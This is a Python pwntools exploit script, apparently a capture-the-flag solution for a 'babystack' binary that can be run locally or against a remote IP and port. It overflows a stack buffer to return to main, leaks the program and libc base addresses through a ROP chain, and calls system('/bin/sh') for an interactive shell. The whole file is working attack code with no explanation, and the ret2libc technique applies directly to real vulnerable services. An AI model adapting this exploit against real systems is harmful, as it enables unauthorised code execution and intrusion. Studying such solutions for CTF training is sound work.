#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()
context.log_level = 'debug'

if(sys.argv[1] == 'l'):
	p = process("./babystack")
	elf = ELF("./babystack")
else:
	p = remote('120.79.17.251',20003)
	elf = ELF("./babystack")

#gdb.attach(p,'b *puts')

###ret2main###
sla("please input your name\n",'Railgun')
sla('plz your choice:\n',str(1))

payload = 'A' * 0x10 + 'deadbeef' + '\xD9' + '\x11'
sda('please input your say???\n',payload)

gdb.attach(p,'b *puts')

###leak base###
sda("please input your name\n",'A'*8)
ru('A' * 0x8)
base = u64(ru('\x55')[-6:].ljust(8,'\x00')) - 0x1090
success('program base:'+hex(base))

###leak libc###
main = base + 0x11D9
pop_rdi = base + 0x000000000000131b
puts_plt = base + elf.symbols['puts']
read_got = base + elf.got['read']

sla('plz your choice:\n',str(1))
payload = 'A' * 0x10 + 'deadbeef' + p64(pop_rdi) + p64(read_got) + p64(puts_plt) + p64(main)
sla('please input your say???\n',payload)

read = u64(ru('\x7f')[-6:].ljust(0x8,'\x00'))
libc = LibcSearcher('read',read)
libc_base = read - libc.dump('read')
print hex(libc_base)
pause()
system = libc_base + libc.dump('system')
sh = libc_base + libc.dump('str_bin_sh')

###ret2libc###
sda("please input your name\n",'AAAAAAAA')
sla('plz your choice:\n',str(1))

payload = 'A' * 0x10 + 'deadbeef' + p64(pop_rdi) + p64(sh) + p64(system)
sla('please input your say???\n',payload)

ia()
